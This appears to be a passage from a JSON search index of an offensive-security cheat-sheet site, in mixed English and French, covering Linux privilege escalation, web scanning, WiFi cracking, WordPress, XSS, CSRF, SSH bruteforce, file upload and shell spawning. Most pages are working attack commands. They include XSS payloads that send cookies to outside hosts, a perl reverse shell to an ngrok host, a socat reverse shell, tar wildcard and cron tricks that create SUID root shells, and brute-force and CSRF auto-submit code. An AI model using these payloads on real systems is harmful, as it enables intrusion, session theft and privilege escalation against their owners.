\u0026#34;--checkpoint=1\u0026#34; touch -- “--checkpoint-action=exec=sh\\ shell.sh” touch shell.sh # Then put your payload in the shell.sh script (#!/bin/sh) cat /etc/shadow \u0026gt; outfile.txt \nExploiting crontab # If a script is running with higher privileges echo \u0026#34;cat /challenge/app-script/ch4/.passwd \u0026gt;/tmp/cracked\u0026#34; \u0026gt; cron.d/go \u0026amp;\u0026amp; chmod a+x cron.d/go \u0026amp;\u0026amp; sleep 60 \u0026amp;\u0026amp; cat /tmp/cracked # Get user ID cat /etc/passwd | grep shell4cracked # C program to get a shell #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main() { setresuid(1028, 1028, 1028); setresuid(1028, 1028, 1028); system(\u0026#34;/bin/bash\u0026#34;); return 0; } # Compile and prepare gcc -o /tmp/pwned /tmp/._cron/shell.c chmod +s /tmp/pwned chmod a+rwx /tmp/pwned \nWritable CRON directory # In /tmp # LD_AUDIT=\u0026#34;libpcprofile.so\u0026#34; PCPROFILE_OUTPUT=\u0026#34;/etc/cron.d/exploit\u0026#34; ping # since it won\u0026#39;t find the .so, the file from PCPROFILE_OUTPUT will be written as word writeable # Then insert payload inside to create suid root program in /tmp printf “***** root cp /bin/dash /tmp/exploit; chmod u+s /tmp/exmploit\\n” \u0026gt; /etc/cron.d/exploit cat /etc/cron.d/exploit ll ./exploit whoami \nSSH update-motd # When you login from SSH, welcome message etc are executed from /etc/update-motd.d # Even if you connect in user, scripts are executed with root privileges # If you can write here or in another folder in the PATH, you can force execution # By redifining \u0026#34;date\u0026#34; or \u0026#34;uname\u0026#34; for example # Example, if you can write to /usr/local/bin you can create a backdoored binary here # If the folder is first in the PATH, the backdoored one will be executed first."
},
{
	"uri": "/recon-enumeration/application-scans/web_application_scan/",
	"title": "Web Application Scans",
	"tags": [],
	"description": "",
	"content": " Nikto # For web applications, you can use nikto to identify potential vulnerabilities # Not very stealth # Think about changing the default user agent ! nitko -h http://monsite.com -o output.xml -Format [csv, xml, html, txt] \nWhatweb # Whatweb is another scanning tool for web applications $ whatweb -h $ whatweb -l # Liste les plugins $ whatweb www.monsite.com $ whatweb www.monsite.com -v $ whatweb www.monsite.com -a 1 # Stealhty $ whatweb www.monsite.com -a 3 # Plus aggressif et plus de test faits \nWordpress - wpscan # Scan Wordpress - version docker disponible $ wpscan -h # Scan non intrusif $ wpscan --url http://monsite.com # Enumeration wpscan.rb --url www.example.com --enumerate # Tout wpscan.rb --url www.example.com --enumerate p # Plugins wpscan.rb --url www.example.com --enumerate u # Users # Scan bruteforce les user énumérés avec une wordlist $ wpscan.rb --url www.example.com --wordlist darkc0de.lst --threads 50 \nJoomla - joomlavs # Scan Joomla - version docker disponible $ joomlavs --url www.monsite.com -v # Enumeration $ joomlavs --url www.monsite.com -a # All $ joomlavs --url www.monsite.com -c # Composants $ joomlavs --url www.monsite.com -m # Modules $ joomlavs --url www.monsite.com -t # Templates $ joomlavs --url www.monsite.com -q # Quiet : full passif \nSSL weakness # Scanner 1 testssl https://monsite.com # Scanner 2 sslscan https://domain.fr \nOnionscan https://github.com/s-rah/onionscan"
},
{
	"uri": "/wireless/wifi_cracking/",
	"title": "WiFi Cracking",
	"tags": [],
	"description": "",
	"content": " Aircrack-NG Suite # Turning on the monitor mode # We can not see packages from SSIDs that we are not associated with airmon-ng start wlan0** # Monitoring # We capture packages running: airodump-ng mon0** # Speeding up # We can launch a de-authentication attack to speed up the process: aireplay-ng -0 3 -a \u0026lt;macaddress of the ap\u0026gt; mon0** # Capturing packages airodump-ng mon0 --bssid –c (channel) –w (file name to save)** # Cracking the cap aircrack-ng RHAWEP-0.1-cap -w /wordlist**# Bypass MAC filter macchanger –m B0:D0:9C:5C:EF:86 wlan0**# Cracking WPS reaver –i mon0 –b \u0026lt;bssid\u0026gt; –d 0**"
},
{
	"uri": "/web-attacks/content-management-system-cms/wordpress/",
	"title": "Wordpress",
	"tags": [],
	"description": "",
	"content": " General \u0026amp; Tricks # Username can be guessed on WordPress since the username will generate a different error message if it doesn\u0026#39;t exist. # Interesting files https://monsite.com/robots.txt https://monsite.com/feed https://monsite.com/readme.html https://monsite.com/xmlrpc.php # Configuration files https://monsite.com/.htaccess https://monsite.com/wp-config.php # Directory listing https://monsite.com/wp-includes # XML-RPC attack (https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit) # You can bruteforce users ./wp-xml-brute http://target.com/xmlrpc.php passwords.txt username1 # If by any way you can upload files, go check /upload or /uploads for your files \nScanning and enumeration # Enumerate users Users can be found using ?author=XXX # You can also use this using /wp-json/wp/v2/users, then iterate that way /wp-json/wp/v2/users/1 # If /?author=1 is 403 Forbidden, you can bypass it # If the .htaccess blocks \u0026#34;?author\u0026#34; # Bypass 1 : http://xxx.fr/?x\u0026amp;author=1 --\u0026gt; http://xxx.fr/author/chris/?x # Bypass 2 : http://lictor.fr/index.php?author=1# WPScan is a great automatic tool (you can dockerise) docker pull wpscanteam/wpscan docker run -it --rm wpscanteam/wpscan -u https://yourblog.com [options] # Non intrusive scan wpscan.rb --url www.example.com # Bruteforce users found using 50 threads wpscan.rb --url www.example.com --wordlist darkc0de.lst --threads 50 # Bruteforce on one user wpscan.rb --url www.example.com --wordlist darkc0de.lst --username admin # Plugins enumeration wpscan.rb --url www.example.com --enumerate p # Users enumeration wpscan.rb --url www.example.com --enumerate u \nReverse Shell # You can reverse shell by editing templates (404.php, footer.php...)"
},
{
	"uri": "/web-attacks/client-side-injections/xss/",
	"title": "XSS Injections",
	"tags": [],
	"description": "",
	"content": " Resources https://html5sec.org/ https://gbhackers.com/top-500-important-xss-cheat-sheet/ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot \nTips # If XSS is not executed through the UI, you can try to insert it through the API # It can then fire on the UI. Many filters are not present like this \nBasic Stored XSS # Setup simple server python -m SimpleHTTPServer 8080 # Test wget -O- http://$(wget -qO- icanhazip.com):8080/lol # Exploit \u0026lt;script\u0026gt;document.location(\u0026#39;http://IP_EXTERNE/\u0026#39;+document.cookie)\u0026lt;/script\u0026gt; \nPayloads # Document.location \u0026lt;script\u0026gt;document.location(\u0026#39;http://IP_EXTERNE/\u0026#39;+document.cookie)\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;document.location.href = \u0026#39;http://requestb.in/XXXXXX?cookies =\u0026#39; + document.cookie;\u0026lt;/script\u0026gt; # Window \u0026lt;script\u0026gt;window.open(\u0026#34;http://monserveur/Cookie=\u0026#34;+document.cookie)\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;window.location=\u0026#39;http://monsite.free.fr/script.php?cookies=\u0026#39;+(document.cookie);\u0026lt;/script\u0026gt; # Document.write \u0026lt;script\u0026gt;document.write(\u0026#39;\u0026lt;img src=\u0026#34;https://requestb.in/xxxxx?cookie=\u0026#34;+document.cookie\u0026gt;admin\u0026lt;/img\u0026gt;\u0026#39;);\u0026lt;/script\u0026gt; admin\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;)\u0026lt;/span\u0026gt;\u0026lt;script\u0026gt;document.write(\u0026#34;\u0026lt;img src=http://requestb.in/XXXXX?cookie=\u0026#34;.concat(encodeURI(document.cookie)).concat(\u0026#34;/\u0026gt;\u0026#34;))\u0026lt;/script\u0026gt;\u0026lt;i\u0026gt; \u0026lt;script\u0026gt;var xhr = new XMLHttpRequest();xhr.open(\u0026#39;POST\u0026#39;, \u0026#39;http://requestb.in/w0sw22w0\u0026#39;, true);xhr.setRequestHeader(\u0026#39;Content-type\u0026#39;, \u0026#39;application/x-www-form-urlencoded\u0026#39;);xhr.send(document.cookie);\u0026lt;/script\u0026gt; # alert(1) in JS \u0026lt;object data=\u0026#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\u0026#34;\u0026gt;\u0026lt;/object\u0026gt;"
},
{
	"uri": "/recon-enumeration/services-enumeration/22_ssh/",
	"title": "22 - SSH",
	"tags": [],
	"description": "",
	"content": " Recon # Banner grabbing using telnet telnet IP 22 \nBruteforce # List of users using wordlists hydra -L users.txt -P \u0026lt;passwordList\u0026gt; -t 3 -s port \u0026lt;IP\u0026gt; ssh # Only one user and wordlist passwords hydra -l root -P \u0026lt;passwordList\u0026gt; -t 3 -s port \u0026lt;IP\u0026gt; ssh \nOpenSSL # Connection through openssl openssl s_client -connect IP:PORT"
},
{
	"uri": "/cryptography/aes/",
	"title": "AES Encryption",
	"tags": [],
	"description": "",
	"content": " Retrieve AES Key and mount partition # Dump AES key aeskeyfind dump # Result 8d 3f 52 7d e5 14 87 2f 59 59 08 95 8d bc 0e d1 # Mount partition echo 8d3f527de514872f595908958dbc0ed1 | xxd -r -p \u0026gt; key.bin sudo cryptsetup luksFormat --verify-passphrase --cipher=aes-ecb --hash=sha1 --key-size=128 --master-key-file=key.bin dump sudo cryptsetup luksOpen dump test sudo mount -t ext4 /dev/mapper/test /mnt/media sudo ls /mnt/media/dir2 \nDecipher encrypted aes256cbc file using openssl # Key d49af309a4c69382ff07bc6f83ba4c2595a7f086d3e5b69e119e2337cb75172d\u0026#39; ----\u0026gt; SHA-256 de \u0026#39;mcsTnTld1dDn\u0026#39;: # Decipher openssl enc -aes-256-cbc -d -in Confidentiel.jpg.enc -out Confidentiel.jpg -iv \u0026#39;0000000000000000\u0026#39; -K \u0026#39;d49af309a4c69382ff07bc6f83ba4c2595a7f086d3e5b69e119e2337cb75172d\u0026#39;"
},
{
	"uri": "/open-source-intelligence-osint/hosting-and-repositories/amazon_digitalocean/",
	"title": "Amazon &amp; Digital Ocean Buckets",
	"tags": [],
	"description": "",
	"content": " Look for static content in HTML, you can find content hosted on s3 bucket for example and then exploit it  \nAmazon S3 (AWS) Buckets # Tools like AWSBucketDump can enumerate AWS S3 buckets https://github.com/jordanpotti/AWSBucketDump \nTeh S3 Bucketeers https://github.com/tomdev/teh_s3_bucketeers/ # You need an AWS account and set your API key in ~/.aws/credentials [default] aws_access_key_id = \u0026lt;key\u0026gt; aws_secret_access_key = \u0026lt;secret\u0026gt; # Then just run it ./bucketeer.sh \u0026lt;target\u0026gt; \u0026lt;target\u0026gt; \nSlurp (https://github.com/0xbharath/slurp) # Go tool to enumerates S3 buckets manually or via certstream slurp domain \u0026lt;-t|--target\u0026gt; google.com slurp keyword \u0026lt;-t|--target\u0026gt; linux,golang,python slurp certstream \nBucket Stream (https://github.com/eth0izzle/bucket-stream) # Find interesting Amazon S3 Buckets by watching certificate transparency logs. # This tool simply listens to various certificate transparency logs (via certstream) # and attempts to find public S3 buckets from permutations of the certificates domain name # Basic python3 bucket-stream.py # You can put credentials / API key in confi.yml file and the tool will try to authenticate and identify bucket owners \nSpace Finder \u0026ndash; Digital Ocean (https://github.com/appsecco/spaces-finder) # Spaces finder is a tool to quickly enumerate DigitalOcean Spaces to look for loot. # It\u0026#39;s similar to a subdomain bruteforcer but is made specifically for DigitalOcean Spaces # Use SecLists as wordlists # If targetting specific company, uses enumall tool to get wordlist python3 spaces_finder.py -l SpacesNames.txt -g interesting_keywords.txt -D -m 500000 -d 1 -t 5"
},
{
	"uri": "/recon-enumeration/application-scans/aquatone/",
	"title": "Aquatone",
	"tags": [],
	"description": "",
	"content": " Aquatone # Aquatone is a complete tool separate in three commands to make complete recon # Collector modules : # Dictionary brute force # DNSDB.org # Google Transparency Report # HackerTarget # Netcraft # Shodan (API key needed) # ThreatCrowd # VirusTotal (API key needed) # PHASE 1 : Discovery # aquatone-discover is the first step # It uses name servers and performs some test to see if wildcard is configured # Then it asks each subdomain collector for potential subdomain # Then it tries to resolve them to see which ones are up and creates the hosts.txt file aquatone-discover -d domain.com # PHASE 2 : Scanning # aquatone-scan will try to find which subdomains serve web content # By default it will scan 80, 443, 8000, 8080 and 8443 but you can specify ports with --ports or pre-configured aliases (small, medium, large, huge) # It creates open_ports.txt and urls.tx # PHASE 3 : Gathering # aquatone-gather can collect HTTP response and screenshots # It uses Nightmare tool to do that # It creates headers, html, report and screenshots folder \nCLI Tricks # Get server technology stats (headers folder) cat * | grep \u0026#39;Server:\u0026#39; | sort | uniq -c | sort -nr # Find more subdomains (html folder) cat * | egrep -o \u0026#39;[a-z0-9\\-\\_\\.]+\\.corp\\.yahoo\\.com\u0026#39; | sort -u # Find HTML comments (html folder) cat * | egrep -o \u0026#39;\u0026lt;!--.*--\u0026gt;\u0026#39; # Find pages with password field (html folder) grep \u0026#39;type=\u0026#34;password\u0026#34;\u0026#39; * # Get hosts listening on port 443 cat open_ports.txt | grep \u0026#39;,443\u0026#39; | cut -d \u0026#34;,\u0026#34; -f 1 # Check HTTPS hosts for Heartbleed grep https urls.txt | cut -d \u0026#39;/\u0026#39; -f 3 \u0026gt; /tmp/targets.lst sslscan --targets=/tmp/targets.lst --no-ciphersuites --no-fallback --no-renegotiation --no-compression --no-check-certificate"
},
{
	"uri": "/web-attacks/client-side-injections/csrf/",
	"title": "CSRF Injections",
	"tags": [],
	"description": "",
	"content": " Basic CSRF 0 protection # Basic form \u0026lt;form name=\u0026#34;pls\u0026#34; action=\u0026#34;https://xxx.fr/index.php?action=profile\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label\u0026gt;Username:\u0026lt;/label\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34; value=\u0026#34;devsid\u0026#34; type=\u0026#34;text\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;br\u0026gt;\t\u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label\u0026gt;Status:\u0026lt;/label\u0026gt; \u0026lt;input name=\u0026#34;status\u0026#34;checked=\u0026#34;checked\u0026#34; type=\u0026#34;checkbox\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;br\u0026gt;\t\u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script language=\u0026#34;javascript\u0026#34;\u0026gt;document.pls.submit();\u0026lt;/script\u0026gt;# Basic form \u0026lt;html\u0026gt;\u0026lt;body\u0026gt; \u0026lt;form name=\u0026#34;csrf\u0026#34; action=\u0026#34;https://xxx.fr/index.php?action=profile\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;username\u0026#34; value=\u0026#34;aaa\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;status\u0026#34; value=\u0026#34;on\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;document.csrf.submit();\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;# Form using XMLHttpRequest \u0026lt;script\u0026gt; var formData = new FormData(); formData.append(\u0026#34;username\u0026#34;, \u0026#34;test\u0026#34;); formData.append(\u0026#34;status\u0026#34;, \u0026#34;on\u0026#34;); var request = new XMLHttpRequest(); request.open(\u0026#34;POST\u0026#34;, \u0026#34;https://xxx.fr/index.php?action=profile\u0026#34;); request.send(formData); \u0026lt;/script\u0026gt;# Encoded payload \u0026lt;svg/onload=eval(atob(\u0026#39;\u0026lt;base 64 payload\u0026gt;\u0026#39;));//\u0026gt; # You can also host a script and then call it if the target is XSS vulnerable // On charge le formulaire dans une frame invisible document.write(\u0026#39;\u0026lt;iframe id=\\\u0026#34;iframe\\\u0026#34; src=\\\u0026#34;https://xxx.fr/index.php?action=profile\\\u0026#34; width=\u0026#34;0\u0026#34; height=\u0026#34;0\u0026#34; onload=\\\u0026#34;pwn()\\\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#39;); //On modifie les champs à notre guise function pwn() { document.getElementById(\u0026#39;iframe\u0026#39;).contentDocument.forms[0].username.value=\u0026#39;titi\u0026#39;; document.getElementById(\u0026#39;iframe\u0026#39;).contentDocument.forms[0].status.checked=true; document.getElementById(\u0026#39;iframe\u0026#39;).contentDocument.forms[0].status.disabled=false document.getElementById(\u0026#39;iframe\u0026#39;).contentDocument.forms[0].submit(); } # Load \u0026lt;script src=\u0026#34;http://XXXXXXX/csrf.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;"
},
{
	"uri": "/web-attacks/client-side-injections/",
	"title": "Client Side Injections",
	"tags": [],
	"description": "",
	"content": " Table of Content  Server Side Injections Client Side Injections File Inclusions and Injections PHP Vulnerabilities Content Management Systems (CMS) Headers Injections MISC \u0026amp; Others  "
},
{
	"uri": "/windows-systems/network-and-domain-recon/domain_recon/",
	"title": "Domain Recon",
	"tags": [],
	"description": "",
	"content": " RPC # You can use rpc to enumerate domain objects rpcclient -U \u0026lt;user\u0026gt; \u0026lt;IP-DC\u0026gt; rpcclient $\u0026gt; enumdomusers rpcclient $\u0026gt; enumdomgroups rpcclient $\u0026gt; querygroupmem 0x200 rpcclient $\u0026gt; srvinfo rpcclient $\u0026gt; querygroup 0x42 rpcclient $\u0026gt; queryuser 0x42 rpcclient $\u0026gt; getdompwinfo rpcclient $\u0026gt; getusrdompwinfo 0x42 \nEnumeration # You can use enum4linux to enumerate domain users # You can try anonymous binding sudo enum4linux domaine.fr ./enum4linux.pl -R 1090-1200 # windapsearch is also a very good tool to perform automated LDAP queries # Enumerate users ./windapsearch.py -d lab.ropnop.com -u ropnop\\\\ldapbind -p GoCubs16 -U ./windapsearch.py -dc-ip 10.10.10.10 -u ropnop\\\\ldapbind -p GoCubs16 -U # enumerate all entries in objectCategory=group ./windapsearch.py -dc-ip 10.10.10.10 -u ropnop\\\\ldapbind -p GoCubs16 -G # Query group membership ./windapsearch.py -dc-ip 10.10.10.10 -u ropnop\\\\ldapbind -p GoCubs16 -m \u0026lt;CN/OU\u0026gt; # Enumerate all domain admins and people having equivalent rights ./windapsearch.py -dc-ip 10.10.10.10 -u ropnop\\\\ldapbind -p GoCubs16 --da # Enumerate all computers ./windapsearch.py -dc-ip 10.10.10.10 -u ropnop\\\\ldapbind -p GoCubs16 -C # Custom search ./windapsearch.py -dc-ip 10.10.10.10 -u ropnop\\\\ldapbind -p GoCubs16 -s \u0026lt;stringToSearch\u0026gt; \nPywerview python pywerview.py get-netuser -w GALACTIC.LAN -u d.traya --dc-ip 192.168.56.103 --username d.traya python pywerview.py get-netgroup -w GALACTIC.LAN -u d.traya --dc-ip 192.168.56.103 --username d.vador \nSMB \u0026amp; Share # Impacket SMB/MSRPC tools # lookupsids → SID Bruteforce through MSRPC Interface # samrdump → SAM Remote Interface (MSRPC) to extract system users, available share etc. # services → Used to (start, stop, delete, status, config, list, create, change) services through MSRPC interface # netview → Get a list of opened sessions and keep tracks of who logged in/off from remote targets # smbclient → generic SMB client # rpcdump → This script will dump the list of RPC endpoints and string bindings registered at the target. # reg → Remote registry manipulation tool through the [MS-RRP] MSRPC Interface. tool.py domain\\user:password@IP \u0026lt;command/parameter\u0026gt; # You can list all shares on a shares on a machine to find potential entry points cme smb 10.69.88.23 -u user -p password --shares# Using smbclient smbclient -L \u0026lt;IP\u0026gt; smbclient -U GALACTIC.LAN\\\\d.vador -L //10.69.88.10# You can browse SMB share using smbclient # The SYSVOL share contains GPO, you can look for a MS14-025 smbclient -U user //10.34.67.4/SYSVOL# MS14-025 → smb: \\NORZH.LAN\\Policies\\{195471B6-B0C6-4AD2-9853-28E2B4E9CEF6}\\Machine\\Preferences\\Groups\\Groups.xml → gpp-decrypt password# You can connect to target as local admin through CrackMapExec cme smb 10.69.88.23 -u Administrator -p password --local-auth# DEFENSIVE POINT OF VIEW # You can list active SMB sessions C:\\\u0026gt; net session # And kill them C:\\\u0026gt; net session \\[LinuxIPaddr] /del"
},
{
	"uri": "/web-attacks/content-management-system-cms/drupal/",
	"title": "Drupal",
	"tags": [],
	"description": "",
	"content": " https://github.com/gfoss/attacking-drupal\nDroopescan # Not Drupal specific but can work too (Wordpress, SilverStripe, Joomla, Moodle, Drupal) droopescan --help droopescan scan --help# Target Identification droopescan scan drupal -u example.org droopescan scan drupal -U list_of_urls.txt # You can also ommit the drupal argument, so it will trigger the cms identification droopescan scan -u example.org droopescan scan -U list_of_urls.txt# Scan types # By default, most of the time, 4 threads droopescan scan drupal -u example.org --number xxx --threads xxx # By default, all tests are done, but you can specify some manually # - p : plugin checks # - t : theme checks # - v : version checks (files checksums) # - i : interesting urls checks droopescan scan drupal -u example.org --enumerate \u0026lt;type\u0026gt;# Getting stats and capabilities for the scanner droopescan stats \nDrupwn # Scanner and complete tool for Drupal 6 and 8 $ drupwn -h ____ / __ \\_______ ______ _ ______ / / / / ___/ / / / __ \\ | /| / / __ \\  / /_/ / / / /_/ / /_/ / |/ |/ / / / / /_____/_/ \\__,_/ .___/|__/|__/_/ /_/ /_/ usage: drupwn [-h] [--users] [--nodes] [--modules] [--dfiles] [--themes] [--version VERSION] [--cookies COOKIES] [--thread THREAD] [--range RANGE] [--ua UA] [--bauth BAUTH] [--delay DELAY] [--log] [--proxy PROXY | --proxies PROXIES] mode target Drupwn aims to automate drupal information gathering. positional arguments: mode enum|exploit target hostname to scan optional arguments: -h, --help show this help message and exit --users user enumaration --nodes node enumeration --modules module enumeration --dfiles default files enumeration --themes theme enumeration --version VERSION Drupal version --cookies COOKIES cookies --thread THREAD threads number --range RANGE enumeration range --ua UA User Agent --bauth BAUTH Basic authentication --delay DELAY request delay --log file logging --proxy PROXY [http|https|socks]://host:port --proxies PROXIES Proxies file \nOnline tools # Attempt to detect version of Drupal Core # Find Plugins in HTML response # Identify theme in use # List client side JS in page # List iframes in page # Test for directory indexing enabled on key locations # Check Google Safe Browse for reputation # Get IP information and Geolocation https://hackertarget.com/drupal-security-scan/"
},
{
	"uri": "/open-source-intelligence-osint/human-recon/email/",
	"title": "E-mails",
	"tags": [],
	"description": "",
	"content": " Online tools # Domain e-mail syntax finder https://www.email-format.com https://hunter.io # E-mail validator https://tools.verifyemailaddress.io/ http://mailtester.com https://dnslytics.com/email-test https://verify-email.org/ \nThe Harvester # theHarvester is a famous OSINT and scrapping tool for passiv recon on targets # Using API keys will highly increase results Usage: theharvester options -d: Domain to search or company name -b: data source: baidu, bing, bingapi, dogpile, google, googleCSE, googleplus, google-profiles, linkedin, pgp, twitter, vhost, virustotal, threatcrowd, crtsh, netcraft, yahoo, all -s: start in result number X (default: 0) -v: verify host name via dns resolution and search for virtual hosts -f: save the results into an HTML and XML file (both) -n: perform a DNS reverse query on all ranges discovered -c: perform a DNS brute force for the domain name -t: perform a DNS TLD expansion discovery -e: use this DNS server -p: port scan the detected hosts and check for Takeovers (80,443,22,21,8080) -l: limit the number of results to work with(bing goes from 50 to 50 results, google 100 to 100, and pgp doesn\\\u0026#39;t use this option) -h: use SHODAN database to query discovered hosts Examples: theharvester -d microsoft.com -l 500 -b google -h myresults.html theharvester -d microsoft.com -b pgp theharvester -d microsoft -l 200 -b linkedin theharvester -d apple.com -b googleCSE -l 500 -s 300 \nSimplyEmail # Another simple tool to do email enumeration https://github.com/SimplySecurity/SimplyEmail ./SimplyEmail.py -all -e cybersyndicates.com or in verbose ./SimplyEmail.py -all -v -e cybersyndicates.com or in verbose and no \u0026#34;Scope\u0026#34; ./SimplyEmail.py -all -v -e cybersyndicates.com -s or with email verification ./SimplyEmail.py -all -v -verify -e cybersyndicates.com or with email verification \u0026amp; Name Creation ./SimplyEmail.py -all -v -verify -n -e cybersyndicates.com or json automation ./SimplyEmail.py -all -e cybersyndicates.com --json cs-json.txt \nZen (https://github.com/s0md3v/Zen) # This tool allows you to retrieve the e-mail address of github users python zen.py username python zen.py https://github.com/username # Find all emails addresses of contributors for one project python zen.py https://github.com/username/repository # Find emails for an organization python zen.py organization --org python zen.py https://github.com/orgs/organzation # Search if the e-mail is present in a breach python zen.py s0md3v --breach"
},
{
	"uri": "/linux-systems/file_transfer/",
	"title": "File Transfer",
	"tags": [],
	"description": "",
	"content": " Linux FTP #!/bin/sh  ftp -n IP \u0026lt;\u0026lt;END_SCRIPT quote USER acknak quote PASS jLQRZy4gyLhmMqz2whTw binary GET file.py quit END_SCRIPT exit 0 # Can also be done over php: \u0026lt;?php echo shell_exec(\u0026#34;echo open 192.168.42.102 21\u0026gt;/usr/local/databases/ftp.txt\u0026#34;);?\u0026gt; \u0026lt;?php echo shell_exec(\u0026#34;echo user acknak jLQRZy4gyLhmMqz2whTw\u0026gt;\u0026gt; /usr/local/databases/ftp.txt\u0026#34;);?\u0026gt; \u0026lt;?php echo shell_exec(\u0026#34;echo binary\u0026gt;\u0026gt; /usr/local/databases/ftp.txt\u0026#34;);?\u0026gt; \u0026lt;?php echo shell_exec(\u0026#34;echo get netcat /usr/local/databases/netcat\u0026gt;\u0026gt;/usr/local/databases/ftp.txt\u0026#34;);?\u0026gt; \u0026lt;?php echo shell_exec(\u0026#34;echo bye\u0026gt;\u0026gt; /usr/local/databases/ftp.txt\u0026#34;);?\u0026gt; \u0026lt;?php echo shell_exec(\u0026#34;ftp -n \u0026lt; /usr/local/databases/ftp.txt\u0026#34;);?\u0026gt;"
},
{
	"uri": "/web-attacks/files-inclusions-and-injections/file_upload/",
	"title": "File Upload",
	"tags": [],
	"description": "",
	"content": " File Upload are well known and kinda old PHP vulnerabilities but can still work some times  \nDouble Extension # If the target is only checking extension → exploit.php.jpg \nMIME Type # Classical, using Burp for example Content-Type: application/x-php → Content-Type: image/gif # Using cURL curl -i -F \u0026#34;file=@shell.php;type=image/gif\u0026#34; --cookie \u0026#34;...\u0026#34; \u0026#34;\u0026lt;target\u0026gt;\u0026#34; # You can also create or update the following registry key on Windows {{HKLM\\SOFTWARE\\Classes\\.php}} # Then create a “String” type registry key and, named “Content-Type\u0026#34; and set the value “image/gif” \nNull Byte → exploit.php%00.jpg \nZIP Upload # You can get resources through ZIP upload and symlinks ln -s ../../../index.php link zip --symlinks test.zip link \nWildcard \u0026amp; tar exploit # If the server is using tar and wildcard (*) on uploaded files, you can exploit it by uploading 3 files : • --checkpoint-action=exec=sh shell.sh • --checkpoint=1 • shell.sh # the shell.sh file contains a payload (different exploit are possible) : • cat \u0026#34;path/index.php\u0026#34; \u0026gt; index.txt • #!/bin/sh perl -e \u0026#39;use Socket;$i=\u0026#34;0.tcp.ngrok.io\u0026#34;;$p=15975;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026#34;tcp\u0026#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDOUT,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDERR,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);exec(\u0026#34;/bin/sh -i\u0026#34;);};\u0026#39; • tar cvf admin.tar ../../../admin \nPNG IDAT Chunks https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/ curl -X POST \u0026#34;http://xxx?page=../upload/ucdn6sCjDxredw1.png\u0026amp;0=readfile\u0026#34; --cookie \u0026#34;\u0026lt;cookie\u0026gt;\u0026#34; -d \u0026#34;1=index.php\u0026#34; --output res"
},
{
	"uri": "/shells-methods/tty_full/",
	"title": "Fully Interactive TTY Shell",
	"tags": [],
	"description": "",
	"content": " Fully Interactive TTY Shell # Using STTY # In reverse shell $ python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Ctrl-Z # In Kali $ stty raw -echo $ fg # In reverse shell $ reset $ export SHELL=bash $ export TERM=xterm-256color $ stty -raw echo OR $ stty rows \u0026lt;num\u0026gt; columns \u0026lt;cols\u0026gt; \nSpawning a shell # Using os.system echo os.system(\u0026#39;/bin/bash\u0026#39;)# Using interactive sh /bin/sh -i# Using Perl, Ruby or Lua perl -e \u0026#39;exec \u0026#34;/bin/sh\u0026#34;;\u0026#39; perl: exec \u0026#34;/bin/sh\u0026#34;; ruby: exec \u0026#34;/bin/sh\u0026#34;; lua: os.execute(\u0026#39;/bin/bash\u0026#39;)# Using Vi :!bash :set shell=/bin/bash:shell# WARNING # OhMyZSH might break this trick # so just launch /bin/bash before in your Kali to exit the /bin/zsh # Using socat # On Kali socat file:`tty`,raw,echo=0 tcp-listen:4444 # On Victim socat exec:\u0026#39;bash -li\u0026#39;,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/frameworks-correlation/gasmask/",
	"title": "Gasmak",
	"tags": [],
	"description": "",
	"content": " General Informations https://github.com/twelvesec/gasmask # All in one information gathering tool # Automated tool used to gather information on the following sources : # - ask, bing, crt, censys.io, dns, dnsdumpster, dogpile, github # - google, googleplus, instagram, linkedin, netcraft, pgp # - reddit, reverse dns, twitter, vhosts, virustotal, whois, # - yahoo, yandex, youtube # 2 modes : Basic \u0026amp; Nongoogle # - whois/dns/reverse DNS/bing virtual hosts # - search in other engines # API Keys needed : shodan, censys, \nUsage ______ __ ___ __ __ / ____/___ ______/ |/ /___ ______/ //_/ / / __/ __ `/ ___/ /|_/ / __ `/ ___/ ,\u0026lt; / /_/ / /_/ (__ ) / / / /_/ (__ ) /| | \\____/\\__,_/____/_/ /_/\\__,_/____/_/ |_| GasMasK - All in one Information gathering tool - OSINT Ver. 1.2 Written by: @maldevel, @mikismaos, @xvass https://www.twelvesec.com/ usage: gasmask.py [-h] [-d DOMAIN] [-s NAMESERVER] [-x PROXY] [-l LIMIT] [-i MODE] [-o BASENAME] [-m MATCH] [-f FILTER] [--count] [-R REPORT] [-B REPORT_BUCKET] [-1 CENSYS_API_ID] [-2 CENSYS_API_SECRET] [-r] [-u] [-a ASN] [-c 